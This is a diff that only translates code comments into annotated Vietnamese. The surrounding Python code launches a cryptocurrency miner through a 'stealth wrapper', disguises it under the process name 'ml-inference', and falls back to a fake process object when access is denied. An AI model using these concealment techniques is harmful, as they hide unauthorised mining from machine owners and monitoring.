@@ -566,10 +566,10 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         import psutil
                         process_type = "cpu"
                         
-                        # Wait for stealth wrapper to spawn child process
+                        # **[Wait for stealth wrapper]** (chờ wrapper ẩn danh) để **[spawn child process]** (tạo tiến trình con)
                         time.sleep(2)
                         
-                        # Find actual mining process by command name
+                        # **[Find actual mining process]** (tìm tiến trình khai thác thực tế) bằng **[command name]** (tên lệnh)
                         target_cmd = "ml-inference"
                         real_mining_pid = None
                         
@@ -586,7 +586,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                                 continue
                         
                         if real_mining_pid:
-                            # Register real mining process for Enhanced PID Logger
+                            # **[Register real mining process]** (đăng ký tiến trình khai thác thực) cho **[Enhanced PID Logger]** (trình ghi PID nâng cao)
                             real_process_obj = psutil.Process(real_mining_pid)
                             register_process(real_mining_pid, process_type, real_process_obj, process_name)
                             logger.info(f"✅ Trình ghi PID nâng cao đã đăng ký PID khai thác thực {real_mining_pid} ({process_type})")
@@ -1019,7 +1019,7 @@ def main():
                 logger.info(f"⏳ Đang chờ worker PID Logger khởi động... (lần {i+1}/5)")
         else:
             logger.error("❌ Worker PID Logger khởi động thất bại sau 5 lần thử")
-            # Force restart worker
+            # **[Force restart worker]** (khởi động lại cưỡng bức worker – tiến trình làm việc)
             from pid_logger import force_restart_worker
             force_restart_worker()
             logger.info("🔄 Đã khởi động lại cưỡng bức worker PID Logger")
@@ -1077,7 +1077,7 @@ def main():
                             logger.warning(f"🤖 PID tiến trình {pid} không còn tồn tại trong lúc đăng ký")
                         except psutil.AccessDenied:
                             logger.warning(f"🤖 Bị từ chối quyền với PID {pid}, dùng tiến trình giả dự phòng")
-                            # Fallback to fake process if access denied
+                            # **[Fallback to fake process]** (dự phòng dùng tiến trình giả) nếu **[access denied]** (bị từ chối quyền truy cập)
                             fake_proc = type('FakeProcess', (), {
                                 'poll': lambda: None if os.path.exists(f"/proc/{pid}") else 0,
                                 'is_running': lambda: os.path.exists(f"/proc/{pid}")
